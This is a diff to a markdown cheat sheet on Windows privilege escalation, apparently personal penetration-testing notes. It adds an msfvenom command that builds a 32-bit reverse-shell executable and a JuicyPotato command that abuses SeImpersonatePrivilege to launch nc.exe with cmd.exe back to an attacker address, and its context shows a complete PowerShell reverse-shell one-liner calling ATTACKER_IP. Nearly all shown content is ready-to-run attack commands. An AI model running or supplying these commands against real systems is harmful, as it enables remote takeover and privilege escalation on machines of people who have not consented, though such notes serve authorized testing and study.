@@ -1,5 +1,15 @@
 # Windows Privilege Escalation - Cheat Sheet
 
+{% hint style="warning" %}
+Check if target si 32 or 64-bit with systeminfo -> System type
+
+Reverse shell for 32bit is:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -a x86 --platform Windows -f exe -o shell.exe
+```
+{% endhint %}
+
 ### 1. System Information
 
 ```powershell
@@ -72,6 +82,9 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#SeImpersonatePrivilege -> 32bit
+juicypotato32.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe -e cmd.exe <IP> <PORT>" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
 ```
 
 ### 9. Exploitation & Enumeration Tools
